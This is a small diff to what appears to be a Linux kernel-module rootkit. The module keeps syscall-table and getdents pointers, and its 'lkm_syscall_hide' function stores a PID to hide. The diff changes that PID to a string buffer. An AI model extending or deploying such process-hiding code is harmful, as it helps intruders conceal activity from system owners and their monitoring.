@@ -26,7 +26,7 @@ MODULE_VERSION("0.1");
 static ulong *syscall_table = NULL;
 static void *original_syscall = NULL;
 static void *original_syscall_getdents = NULL;
-static int hidden_pid;
+static char hidden_pid[16];
 static char buffer[32768];
 
 struct linux_dirent {
@@ -41,7 +41,7 @@ typedef int (*getdents)(unsigned int, struct linux_dirent *, unsigned int);
 static unsigned long lkm_syscall_hide(int pid)
 {
     printk("%s: Hiding PID %i\n", TAG, pid);
-    hidden_pid = pid;
+    sprintf(hidden_pid, "%i", pid);
     return 0;
 }
 
